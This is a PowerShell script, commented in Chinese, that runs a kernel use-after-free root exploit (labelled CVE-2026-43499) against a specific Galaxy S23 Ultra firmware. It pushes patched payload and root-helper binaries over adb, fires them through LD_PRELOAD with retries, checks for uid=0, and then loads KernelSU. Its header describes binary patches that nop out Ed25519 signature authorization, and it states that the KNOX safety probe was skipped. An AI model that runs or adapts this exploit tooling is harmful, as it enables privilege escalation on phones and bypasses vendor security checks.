# =============================================================================
#  s9110-root-kit dm3q 适配版 — Galaxy S23 Ultra (SM-S9180 / S9180ZHS8FZG1)
#  内存态 root + KernelSU（签名授权已去除，KNOX 探针已跳过）
#  CVE-2026-43499 (GhostLock) 内核 UAF 提权
#
#  用法：
#    .\run_root_dm3q.ps1                完整流程
#    .\run_root_dm3q.ps1 --skip-push    跳过推送（文件已在设备）
#    .\run_root_dm3q.ps1 --no-app       不装 KernelSU Manager App
#    .\run_root_dm3q.ps1 --verify       只检查设备状态
#    .\run_root_dm3q.ps1 -Attempts 2    重试 2 次
#
#  补丁说明：
#    dm3q payload @ 0x9480: b.ne -> nop  (跳过 grku Ed25519 签名授权)
#    dm3q root    @ 0x22bc: b.ne -> nop  (同上)
#    dm3q root    @ 0x2304: b.ne -> nop  (同上)
#    保留 verifying-kernel-access 自校验，偏移不匹配会安全拦截
#
#  !!! 风险声明：
#    KNOX e-fuse 熔断不可逆。root 是内存态，重启失效。
#    本脚本已按用户要求跳过 KNOX 探针检查。
# =============================================================================

param(
    [switch]$SkipPush,
    [switch]$NoApp,
    [switch]$Verify,
    [int]$Attempts = 1
)

$ErrorActionPreference = "Continue"

# ===== 配置 =====
$ScriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
$Payload   = "$ScriptDir\payloads\dm3q-S9180ZHS8FZG1__payload"
$RootHelper= "$ScriptDir\payloads\dm3q-S9180ZHS8FZG1__root"
$Ksud      = "$ScriptDir\tools\ksud-samsung-android13-5.15-kdp"
$Apk       = "$ScriptDir\tools\KernelSU_Manager_v3.2.5_32525.apk"

# 设备目标路径
$DevPayload  = "/data/local/tmp/cve-2026-43499"
$DevRoot     = "/data/local/tmp/cve-2026-43499-root"
$DevKsud     = "/data/local/tmp/ksud-selected"

$WarmupIters = 400
$TargetFirmware = "S9180ZHS8FZG1"

# ===== 日志 =====
$LogDir = "$ScriptDir\logs"
if (-not (Test-Path $LogDir)) { New-Item -ItemType Directory -Path $LogDir -Force | Out-Null }
$TimeStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$LogFile = "$LogDir\run_dm3q_$TimeStamp.log"

function Write-Log {
    param([string]$Level, [string]$Message)
    $line = "[$(Get-Date -Format 'HH:mm:ss')][$Level] $Message"
    Add-Content -Path $LogFile -Value $line
    switch ($Level) {
        "ERR"  { Write-Host $line -ForegroundColor Red }
        "WARN" { Write-Host $line -ForegroundColor Yellow }
        "OK"   { Write-Host $line -ForegroundColor Green }
        "STAGE"{ Write-Host $line -ForegroundColor Cyan }
        default{ Write-Host $line }
    }
}

# ===== ADB 查找 =====
function Find-Adb {
    if ($env:ADB_BIN -and (Test-Path $env:ADB_BIN)) {
        return $env:ADB_BIN
    }
    # 优先内置 adb
    $builtin = "$ScriptDir\adb-bin\adb.exe"
    if (Test-Path $builtin) { return $builtin }
    # PATH 中的 adb
    $sysAdb = (Get-Command adb -ErrorAction SilentlyContinue).Source
    if ($sysAdb) { return $sysAdb }
    # 常见位置
    $commonPaths = @(
        "$env:LOCALAPPDATA\Android\Sdk\platform-tools\adb.exe",
        "C:\platform-tools\adb.exe",
        "D:\platform-tools\adb.exe"
    )
    foreach ($p in $commonPaths) {
        if (Test-Path $p) { return $p }
    }
    return $null
}

function Invoke-Adb {
    param([string[]]$Args)
    $cmd = "& `"$Adb`" $($Args -join ' ')"
    Write-Log "ADB" "$cmd"
    $out = & $Adb $Args 2>&1
    $rc = $LASTEXITCODE
    if ($rc -ne 0) {
        Write-Log "ERR" "adb return=$rc :: $($Args -join ' ')"
    }
    Add-Content -Path $LogFile -Value "[$(Get-Date -Format 'HH:mm:ss')][OUT] $out"
    return @{ Output = $out; ExitCode = $rc }
}

# ===== 入口 =====
Write-Host "============================================================" -ForegroundColor Cyan
Write-Host "  s9110-root-kit dm3q 适配版" -ForegroundColor Cyan
Write-Host "  Galaxy S23 Ultra (SM-S9180 / $TargetFirmware)" -ForegroundColor Cyan
Write-Host "  内存态 root + KernelSU | 签名授权已去除 | KNOX 探针已跳过" -ForegroundColor Cyan
Write-Host "  日志: $LogFile" -ForegroundColor Cyan
Write-Host "============================================================" -ForegroundColor Cyan

Write-Log "STAGE" "start (verify=$Verify, attempts=$Attempts)"

# ===== ADB 检查 =====
$Adb = Find-Adb
if (-not $Adb) {
    Write-Log "ERR" "adb not found. 设置 `$env:ADB_BIN 或安装 platform-tools"
    exit 1
}
Write-Log "OK" "adb: $Adb"

# ===== 设备连接检查 =====
$state = (& $Adb get-state 2>&1 | Out-String).Trim()
if ($LASTEXITCODE -ne 0 -or $state -ne "device") {
    Write-Log "ERR" "设备未连接 (state=$state). 开启 USB 调试并授权本机"
    exit 1
}
Write-Log "OK" "设备已连接"

# ===== 固件检查 =====
$kernel = (& $Adb shell "uname -r" 2>&1 | Out-String).Trim()
$fp = (& $Adb shell "getprop ro.build.fingerprint" 2>&1 | Out-String).Trim()
Write-Log "INFO" "kernel=$kernel"
Write-Log "INFO" "fingerprint=$fp"
Write-Host "kernel: $kernel"
Write-Host "fingerprint: $fp"

if ($fp -match $TargetFirmware) {
    Write-Log "OK" "固件匹配 $TargetFirmware"
} else {
    Write-Log "WARN" "固件不匹配 (期望 $TargetFirmware)"
    $ans = Read-Host "强制继续? (输入 YES)"
    if ($ans -ne "YES") {
        Write-Log "ERR" "用户取消"
        exit 1
    }
    Write-Log "WARN" "用户强制继续（固件不匹配）"
}

# ===== KNOX 探针已跳过（按用户要求）=====
Write-Log "WARN" "KNOX 探针已跳过（按用户要求）。运行可能触发 e-fuse，风险自负。"

# ===== Verify 模式 =====
if ($Verify) {
    Write-Log "STAGE" "verify 模式"
    $r1 = Invoke-Adb "shell" "ls -l $DevPayload $DevRoot $DevKsud 2>&1"
    Write-Host $r1.Output
    $modOut = (& $Adb shell "cat /proc/modules" 2>&1 | Out-String)
    if ($modOut -match "kernelsu") {
        Write-Log "OK" "kernelsu 已加载 (设备当前有 root)"
    } else {
        Write-Log "WARN" "kernelsu 未加载 (自上次重启后未 root)"
    }
    Write-Log "OK" "verify 完成"
    exit 0
}

# ===== 推送文件 =====
if (-not $SkipPush) {
    Write-Log "STAGE" "推送文件"
    foreach ($f in @($Payload, $RootHelper, $Ksud)) {
        if (-not (Test-Path $f)) {
            Write-Log "ERR" "缺少文件: $f"
            exit 1
        }
    }
    $r = Invoke-Adb "push" $Payload $DevPayload
    if ($r.ExitCode -ne 0) { Write-Log "ERR" "推送 payload 失败"; exit 1 }
    $r = Invoke-Adb "push" $RootHelper $DevRoot
    if ($r.ExitCode -ne 0) { Write-Log "ERR" "推送 root helper 失败"; exit 1 }
    $r = Invoke-Adb "push" $Ksud $DevKsud
    if ($r.ExitCode -ne 0) { Write-Log "ERR" "推送 ksud 失败"; exit 1 }
    $r = Invoke-Adb "shell" "chmod 755 $DevPayload $DevRoot $DevKsud"
    Write-Log "OK" "3 个文件已推送并 chmod 755"
} else {
    Write-Log "WARN" "--skip-push: 跳过推送"
}

# ===== 预热 =====
Write-Log "STAGE" "预热 ($WarmupIters x /system/bin/true)"
$null = & $Adb shell "i=0; while [ `$i -lt $WarmupIters ]; do /system/bin/true; i=`$((i+1)); done" 2>&1

# ===== 触发 exploit =====
Write-Log "STAGE" "触发 exploit (EXPLOIT_ATTEMPTS=$Attempts)"
Write-Host "设备可能重启 — 正常现象" -ForegroundColor Yellow

$RootOk = $false
for ($attempt = 1; $attempt -le 3; $attempt++) {
    Write-Log "STAGE" "exploit 尝试 $attempt/3"
    
    $null = & $Adb wait-for-device 2>&1
    Start-Sleep -Seconds 2
    
    $cmd = "CVE43499_ROOT_HELPER=$DevRoot EXPLOIT_ATTEMPTS=$Attempts LD_PRELOAD=$DevPayload /system/bin/true"
    $out = (& $Adb shell $cmd 2>&1 | Out-String)
    Add-Content -Path $LogFile -Value "[$(Get-Date -Format 'HH:mm:ss')][OUT] $out"
    
    # 提取关键行
    $lines = $out -split "`n" | Select-String -Pattern "stage=|attempt|root|fail|error|panic|uid=|temporary" | Select-Object -First 12
    foreach ($l in $lines) { Write-Log "INFO" "exploit> $($l.Line.Trim())" }
    
    # 检查成功标志
    if ($out -match "temporary-root-ready") {
        $RootOk = $true
        Write-Log "OK" "stage=temporary-root-ready (尝试 $attempt)"
        break
    }
    
    # operation failed = 可能之前已成功
    if ($out -match "operation failed") {
        Write-Log "WARN" "operation failed — 若上一轮已成功，说明 KernelSU 已加载，重启后再试"
    }
    
    # 通过 root helper 验证
    $idOut = (& $Adb exec-out "$DevRoot" "-c" "/system/bin/id" 2>&1 | Out-String)
    Add-Content -Path $LogFile -Value "[$(Get-Date -Format 'HH:mm:ss')][OUT] id: $idOut"
    if ($idOut -match "uid=0\(root\)") {
        $RootOk = $true
        Write-Log "OK" "uid=0(root) 已确认 (尝试 $attempt)"
        break
    }
    
    if ($attempt -lt 3) {
        Write-Log "WARN" "尝试 $attempt 未成功，3 秒后重试"
        Start-Sleep -Seconds 3
    }
}

if (-not $RootOk) {
    Write-Log "ERR" "exploit 未能获取 root"
    Write-Host ""
    Write-Host "诊断:" -ForegroundColor Yellow
    Write-Host "  * KernelSU 已加载时二次触发会 operation failed -> 重启后再跑"
    Write-Host "  * 若日志有 'verification failed E101' -> 文件未打补丁"
    Write-Host "  * 若 E101 消失但无 temporary-root-ready -> 偏移自校验未过"
    exit 1
}

Write-Log "STAGE" "root 已获取"
$idResult = Invoke-Adb "exec-out" $DevRoot "-c" "/system/bin/id"
Write-Host $idResult.Output

# ===== KernelSU =====
Write-Log "STAGE" "安装 KernelSU (late-load)"
$ksuOut = Invoke-Adb "shell" "$DevRoot --late-load"
Start-Sleep -Seconds 2
$modOut = (& $Adb shell "cat /proc/modules" 2>&1 | Out-String)
Add-Content -Path $LogFile -Value "[$(Get-Date -Format 'HH:mm:ss')][OUT] $modOut"
if ($modOut -match "kernelsu") {
    Write-Log "OK" "kernelsu 已加载"
    $modOut -split "`n" | Select-String "kernelsu" | ForEach-Object { Write-Host $_.Line }
} else {
    Write-Log "ERR" "kernelsu 未出现在 /proc/modules"
    Write-Host "手动重试: adb shell $DevRoot --late-load" -ForegroundColor Yellow
}

# ===== KernelSU Manager App =====
if (-not $NoApp) {
    Write-Log "STAGE" "安装 KernelSU Manager App"
    $apkResult = Invoke-Adb "install" "-r" $Apk
    if ($apkResult.ExitCode -eq 0) {
        Write-Log "OK" "KernelSU Manager 已安装 (me.weishu.kernelsu)"
        $null = & $Adb shell "am start -n me.weishu.kernelsu/.ui.MainActivity" 2>&1
    } else {
        Write-Log "WARN" "App 安装失败，请手动安装"
    }
}

# ===== 完成 =====
Write-Host ""
Write-Host "============================================================" -ForegroundColor Cyan
Write-Host "  done." -ForegroundColor Green
Write-Host "  * root 是内存态，重启后失效；再次 root 直接重跑本脚本"
Write-Host "  * 二次运行若 operation failed：先重启设备再跑"
Write-Host "  * 装 KernelSU Manager 后，su 由 App 内授权管理"
Write-Host "  * 日志: $LogFile"
Write-Host "============================================================" -ForegroundColor Cyan
Write-Log "OK" "全部完成"
